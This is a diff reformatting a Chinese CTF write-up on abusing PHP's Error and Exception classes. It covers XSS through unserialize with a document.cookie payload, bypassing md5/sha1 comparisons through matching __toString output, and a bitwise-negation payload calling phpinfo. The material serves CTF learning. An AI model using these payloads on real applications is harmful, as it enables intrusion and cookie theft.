@@ -37,7 +37,7 @@ php7以上
 
 开启报错情况下
 
-```PHP
+```php
 <?php
 highlight_file(__FILE__);
 $a=new Error("<script>alert(1)</script>");
@@ -51,15 +51,14 @@ echo $c;
 
 造成了xss攻击。
 
-## **Exception类**
+## Exception类
 
-**利用条件**
+利用条件：
+`php5、php7
+`开启报错的情况下
 
-php5、php7
 
-开启报错的情况下
-
-```PHP
+```php
 <?php
 highlight_file(__FILE__);
 $a=new Error("<script>alert(1)</script>");
@@ -71,12 +70,13 @@ echo $c;
 
 就是上面的换了一个类
 
-### **[BJDCTF 2nd]****xss****之光** 通过git拿到源码
+### BJDCTF 2nd【xss之光】 
+通过git拿到源码
 
 ```php
 <?php 
 $a = $_GET['yds_is_so_beautiful'];
-Echo unserialize($a);
+echo unserialize($a);
 ```
 
 给了GET传参，进行反序列化，不知道怎么自定义类，遇到了反序列化没有POP链的情况。只能通过php内置类进行反序列化，又存在echo，可以用__toString方法返回对象进行反序列化。该题为XSS之光，所以可以通过XSS拿出FLAG。
@@ -85,20 +85,21 @@ Echo unserialize($a);
 
 ```php
 <?php
-$poc=new        Exception("<script>alert(document.cookie)</script>");
+$poc=new Exception("<script>alert(document.cookie)</script>");
 Echo urlencode(serialize($poc));?>
 //反弹cookie
 ```
 
 将得到的结果传入
 
+```bash
 /?yds_is_so_beautiful=$POC
-
+```
 ## 利用Error/Exception 内置类绕过哈希比较
 
 测试代码
 
-```PHP
+```php
 <?php
 $a = new Error("payload",1);
 echo $a;
@@ -106,7 +107,7 @@ echo $a;
 
 发现会以字符串进行输出，包括当前的错误信息payload以及报错的行号2，传入 Error("payload",1) 中的错误代码“1”则没有输出出来。
 
-```Bash
+```php
 <?php
 $a = new Error("payload",1);
 $b = new Error("payload",2);
@@ -115,9 +116,9 @@ echo "\r\n\r\n";
 echo $b;
 ```
 
-输出
+输出:
 
-```HTTP
+```php
 Error: payload in D:\phpstudy_pro\WWW\test.php:2
 Stack trace:
 #0 {main}
@@ -127,13 +128,14 @@ Stack trace:
 #0 {main}
 ```
 
-$$a 和$$b 这两个错误对象本身是不同的，但是 __toString 方法返回的结果是相同的。
+`$a` 和`$b` 这两个错误对象本身是不同的，但是 __toString 方法返回的结果是相同的。
 
-可以利用这个方法果然哈希比较。
+可以利用这个方法绕过哈希比较。
 
-**[2020 极客大挑战]Greatphp** 考点：php内置绕过哈希比较、php取反绕过
+### 2020 极客大挑战【Greatphp】
+考点：php内置绕过哈希比较、php取反绕过
 
-```Bash
+```php
 <?php
 error_reporting(0);
 class SYCLOVER {
@@ -161,13 +163,13 @@ if (isset($_GET['great'])){
 
 要是常见的php题目，可以数组绕过强类型。在这题目中，需要Error类。
 
-```PHP
+```php
 if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)))
 ```
 
 md5()和sha1()可以对一个类进行hash，并且会触发这个类的 __toString 方法；且当eval()函数传入一个类对象时，也会触发这个类里的 __toString 方法。
 
-![](https://ucnckoaspefs.feishu.cn/space/api/box/stream/download/asynccode/?code=OTI1NjY1MjUxOTExMWU5YjAxZTBkZWFlNDRiZTE5MjVfclJiczNLZkZ4NDBKSVFmWmlvY0RUQXdnYXkyVHd1T2pfVG9rZW46S3FrbmJWQ01Db05HRFl4U1VpTWNUb0g5bldkXzE3NjQ1MzA3NTk6MTc2NDUzNDM1OV9WNA)
+![700](assets/php原生类利用/file-20251212232247762.png)
 
   
 
@@ -175,12 +177,12 @@ md5()和sha1()可以对一个类进行hash，并且会触发这个类的 __toStr
 
 进行php取反
 
-```Plain
+```bash
 C:\Users\Administrator>php -r "echo urlencode(~'phpinfo');"
-%8F%97%8F%96%91%99%90
+# %8F%97%8F%96%91%99%90
 ```
 
-```Plain
+```php
 Payload:?code=(~%8F%97%8F%96%91%99%90)();
 ```
 
